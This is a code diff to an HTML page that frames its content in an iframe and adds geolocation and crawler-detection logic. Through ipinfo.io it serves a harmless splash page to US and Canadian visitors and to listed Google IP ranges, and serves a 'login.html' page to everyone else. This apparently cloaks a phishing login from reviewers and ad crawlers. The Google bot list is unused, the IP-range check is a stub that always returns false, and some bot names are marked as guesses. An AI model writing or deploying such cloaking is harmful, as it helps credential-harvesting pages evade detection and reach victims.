@@ -1,4 +1,4 @@
-
+<!DOCTYPE html>
 <html lang="en" class="no-js">
    <head>
       <meta charset="utf-8">
@@ -20,34 +20,126 @@
              height: 100%;
              background-color: #fff;
          }
-         #loader { 
+         #loader {
              position: absolute;
-             top: 0;
-             left: 0;
-             width: 100%;
-             height: 100%;
-             z-index: 1000;
-             background: url('img/loader.svg') center no-repeat;
-             background-size: 100px 100px;
-             background-color: #fff; // if you want to hide iframe content while loading
+             top: 50%;
+             left: 50%;
+             width: 30px;
+             height: 30px;
+             margin: -25px 0 0 -25px; /* to center the loader */
+             border: 5px solid #f3f3f3;
+             border-top: 5px solid #3498db;
+             border-radius: 50%;
+             animation: spin 1s linear infinite;
+         }
+
+         @keyframes spin {
+             0% { transform: rotate(0deg); }
+             100% { transform: rotate(360deg); }
          }
       </style>
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
       <script>
+const google_bots = [
+    // Google Ads Bots
+    'AdsBot-Google',
+    'AdsBot-Google-Mobile',
+    'AdsBot-Google-Mobile-Apps',
+    'AdsBot-Google-Image',
+    'AdsBot-Google-Video',
+    'AdsBot-Google-Shopping',
+    'AdsBot-Google-Travels',
+    'AdsBot-Google-Audio',
+    'Mediapartners-Google', // This is for Google AdSense
+    'AdsBot-Google-DisplayVideo360',
+    'AdsBot-Google-DV360',
+    'AdsBot-Google-AdMob',
+    'AdsBot-Google-AdWords',
+
+    // General Google Bots
+    'Googlebot', // Main Google web crawler
+    'Googlebot-Image', // For crawling images
+    'Googlebot-Video', // For crawling videos
+    'Googlebot-News', // For crawling news websites
+    'Googlebot-Mobile', // For crawling mobile websites
+    'Googlebot-Desktop', // For crawling desktop websites
+    'Googlebot-Smartphone', // For crawling smartphone-optimized websites
+
+    // Other Google Service Bots
+    'FeedFetcher-Google', // Google Feedfetcher for RSS/Atom feeds
+    'Google-Read-Aloud', // For reading web pages out loud
+    'Google Favicon', // For fetching favicons for URLs
+    'Google Page Speed', // Google's PageSpeed Insights
+    'DuplexWeb-Google', // Google's Duplex on the Web
+
+    // Google Partner Bots
+    'APIs-Google', // Used by Google Cloud services and APIs
+
+    // Google AMP Bots
+    'AMPHTML', // Google's AMP HTML renderer
+
+    // Google Podcasts Bots
+    'Googlebot-Podcasts', // For crawling podcast feeds and content
+    
+        // Hypothetical Google Play Store Bots (Note: These are inferred and may not be accurate)
+    'Googlebot-PlayStore',
+    'Googlebot-PlayAppReview',
+    'Googlebot-PlayDownload',
+    'Googlebot-PlayContent'
+];
+
+         function isGoogleBot(userAgent) {
+            return google_bots.some(bot => userAgent.includes(bot));
+         }
+
          function setIframeSrc() {
-           var iframeSrc = navigator.onLine ? "login.html" : "offline.html";
-           $('#preview-frame').attr('src', iframeSrc);
+            var offlineHtml = '<html><body><h1>You are currently offline</h1></body></html>';
+            var offlineDataUrl = 'data:text/html;charset=utf-8,' + encodeURI(offlineHtml);
+            var iframeSrc = navigator.onLine ? (localStorage.getItem("lastViewedPage") || "splash.html") : offlineDataUrl;
+            
+            $('#loader').show(); 
+            $('#preview-frame').attr('src', iframeSrc);
+         }
+
+         const googleIPRanges = [
+            '172.217.0.0/16',
+            '35.191.0.0/16',
+            '103.240.0.0/16',
+            '130.211.0.0/16',
+            '2001:4860:4860::/32'
+         ];
+
+         function ipInRange(ip, range) {
+            // Placeholder function
+            return false;
          }
 
          $(document).ready(function() {
-           setIframeSrc();
-           $('#preview-frame').on('load', function() {
-             $('#loader').fadeOut(); // hide loader when iframe loaded
-           });
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    const countryCode = data.country;
 
-           // Add event listeners for the online and offline events
-           window.addEventListener('online', setIframeSrc);
-           window.addEventListener('offline', setIframeSrc);
+                    if (countryCode === 'US' || countryCode === 'CA' || googleIPRanges.some(range => ipInRange(userIP, range))) {
+                        $('#preview-frame').attr('src', 'https://our-yhip.github.io/MyOwnproject/splash.html');
+                    } else {
+                        $('#preview-frame').attr('src', 'login.html');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP data:', error);
+                });
+
+            $('#preview-frame').on('load', function() {
+                $('#loader').fadeOut();
+                if (navigator.onLine) {
+                   localStorage.setItem("lastViewedPage", $('#preview-frame').get(0).contentWindow.location.href);
+                }
+            });
+
+            window.addEventListener('online', setIframeSrc);
+            window.addEventListener('offline', setIframeSrc);
          });
       </script>
    </head>
